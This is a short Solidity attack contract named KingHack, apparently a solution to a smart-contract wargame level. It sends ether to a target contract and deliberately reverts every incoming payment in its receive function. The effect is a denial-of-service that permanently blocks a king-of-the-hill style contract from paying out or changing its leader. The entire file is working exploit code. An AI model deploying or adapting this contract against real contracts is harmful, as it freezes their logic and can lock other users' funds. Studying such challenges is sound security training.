pragma solidity ^0.6.0;

contract KingHack{

    address payable owner;
    uint counter = 0;
    constructor() public {

      owner = msg.sender;
    
    }


    function get_ether() external payable onlyOwner {
        // allow payments to this function one time only
        // by requiring counter to equal 0
        require(counter==0);
        counter+=1;
        
    }


    function send_ether(address contract_address, uint amount) public {
        // send ether to the vulnerable contract
        (bool success, ) = payable(contract_address).call{value:amount}("");
        require(success,"transfer failed");
    }

    receive() external payable{
        // prevent receiving ether into this contract
        // by requiring an impossible condition
        require(false, "NO");
        }

    modifier onlyOwner(){
    require(msg.sender==owner);
    _;
    }

}